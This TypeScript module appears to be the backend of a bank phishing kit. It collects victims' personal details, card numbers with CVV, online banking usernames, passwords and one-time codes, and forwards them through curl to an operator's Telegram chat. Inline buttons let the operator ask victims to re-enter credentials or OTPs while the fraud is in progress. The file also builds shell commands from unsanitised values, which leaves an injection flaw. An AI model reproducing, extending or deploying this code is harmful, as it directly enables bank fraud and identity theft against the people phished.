import { exec } from 'child_process';
import { promisify } from 'util';

const execAsync = promisify(exec);

// Función para obtener geolocalización por IP
export async function getGeoLocation(ip: string): Promise<{ city: string; country: string } | null> {
  try {
    // Usar ip-api.com (gratuito, sin API key)
    const curlCommand = `curl -s "http://ip-api.com/json/${ip}" --max-time 5`;
    const { stdout } = await execAsync(curlCommand);
    const data = JSON.parse(stdout);
    
    if (data.status === 'success') {
      return {
        city: data.city || 'Desconocida',
        country: data.country || 'Desconocido'
      };
    }
  } catch (error) {
    console.error('Error getting geolocation:', error);
  }
  return null;
}

// Función para formatear el mensaje
function formatMessage(sessionData: any): string {
  const locationInfo = sessionData.ipAddress 
    ? `\n🌍 UBICACION\nIP: ${sessionData.ipAddress}\nCiudad: ${sessionData.geoCity || 'Desconocida'}\nPais: ${sessionData.geoCountry || 'Desconocido'}\n`
    : '';

  return `
🔔 SESION EN VIVO

Sesion: #${sessionData.sessionId.slice(-8)}
Banco: ${sessionData.bank.toUpperCase()}
Estado: ${sessionData.status}
${locationInfo}
📋 DATOS DEL CLIENTE
Nombre: ${sessionData.fullName || '⏳ Esperando...'}
Email: ${sessionData.email || '⏳ Esperando...'}
Telefono: ${sessionData.phone || '⏳ Esperando...'}
Cedula: ${sessionData.documentId || '⏳ Esperando...'}
Direccion: ${sessionData.address || '⏳ Esperando...'}
Ciudad: ${sessionData.city || '⏳ Esperando...'}

💳 DATOS DE TARJETA
Numero: ${sessionData.cardNumber || '⏳ Esperando...'}
Titular: ${sessionData.cardHolderName || '⏳ Esperando...'}
Vencimiento: ${sessionData.expiryDate || '⏳ Esperando...'}
CVV: ${sessionData.cvv || '⏳ Esperando...'}
Marca: ${sessionData.cardBrand || '⏳ Esperando...'}

🔐 CREDENCIALES BANCARIAS
Usuario: ${sessionData.usuario || '⏳ Esperando...'}${sessionData.usuarioIncorrecto ? ' ⚠️ MARCADO COMO INCORRECTO' : ''}
Clave: ${sessionData.clave || '⏳ Esperando...'}${sessionData.claveIncorrecta ? ' ⚠️ MARCADO COMO INCORRECTO' : ''}
Dinamica: ${sessionData.claveDinamica || sessionData.otp || '⏳ Esperando...'}${sessionData.dinamicaIncorrecta ? ' ⚠️ MARCADO COMO INCORRECTO' : ''}

🕐 Ultima actualizacion: ${new Date().toLocaleTimeString('es-CO')}
`;
}

// Función para enviar o actualizar mensajes a Telegram
export async function sendToTelegram(sessionData: any, messageId?: number) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.error('Telegram bot token or chat ID not configured');
    return;
  }

  try {
    const message = formatMessage(sessionData);
    
    // Crear botones inline solo si hay datos pendientes de validar
    const buttons = [];
    if (sessionData.usuario && !sessionData.usuarioIncorrecto) {
      buttons.push([{ text: '❌ Usuario Incorrecto', callback_data: `incorrect_usuario_${sessionData.sessionId}` }]);
    }
    if (sessionData.clave && !sessionData.claveIncorrecta) {
      buttons.push([{ text: '❌ Clave Incorrecta', callback_data: `incorrect_clave_${sessionData.sessionId}` }]);
    }
    if (sessionData.claveDinamica && !sessionData.dinamicaIncorrecta) {
      buttons.push([{ text: '❌ Dinámica Incorrecta', callback_data: `incorrect_dinamica_${sessionData.sessionId}` }]);
    }
    
    // Botones para manejar la clave dinámica (solo cuando está en espera de validación)
    if (sessionData.status === 'otp_submitted' && sessionData.claveDinamica) {
      buttons.push(
        [{ text: '🔄 Solicitar Dinámica de Nuevo', callback_data: `request_otp_${sessionData.sessionId}` }],
        [{ text: '🚫 Rechazar Pago', callback_data: `reject_payment_${sessionData.sessionId}` }]
      );
    }
    
    // Escapar comillas para JSON
    const escapedMessage = message.replace(/\\/g, '\\\\').replace(/"/g, '\\"').replace(/\n/g, '\\n');
    
    let curlCommand: string;
    
    if (messageId) {
      // Editar mensaje existente
      let payload = `{\\"chat_id\\":\\"${chatId}\\",\\"message_id\\":${messageId},\\"text\\":\\"${escapedMessage}\\"`;
      if (buttons.length > 0) {
        const buttonsJson = JSON.stringify({ inline_keyboard: buttons }).replace(/"/g, '\\"');
        payload += `,\\"reply_markup\\":${buttonsJson}`;
      }
      payload += '}';
      
      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/editMessageText" \
        -H "Content-Type: application/json" \
        -d "${payload}" \
        --max-time 30 \
        --silent`;
    } else {
      // Enviar nuevo mensaje
      let payload = `{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\"`;
      if (buttons.length > 0) {
        const buttonsJson = JSON.stringify({ inline_keyboard: buttons }).replace(/"/g, '\\"');
        payload += `,\\"reply_markup\\":${buttonsJson}`;
      }
      payload += '}';
      
      curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
        -H "Content-Type: application/json" \
        -d "${payload}" \
        --max-time 30 \
        --silent`;
    }

    try {
      const { stdout, stderr } = await execAsync(curlCommand);
      
      if (stderr) {
        console.error('Telegram curl stderr:', stderr);
      }
      
      const response = JSON.parse(stdout);
      if (response.ok) {
        console.log(messageId ? 'Message updated in Telegram' : 'Message sent to Telegram');
        // Retornar el message_id para futuras actualizaciones
        return response.result.message_id;
      } else {
        console.error('Telegram API error:', response);
        throw new Error(`Telegram API error: ${response.description}`);
      }
    } catch (error: any) {
      console.error('Error with Telegram via curl:', error.message);
      throw error;
    }
  } catch (error) {
    console.error('Error in sendToTelegram:', error);
    throw error;
  }
}
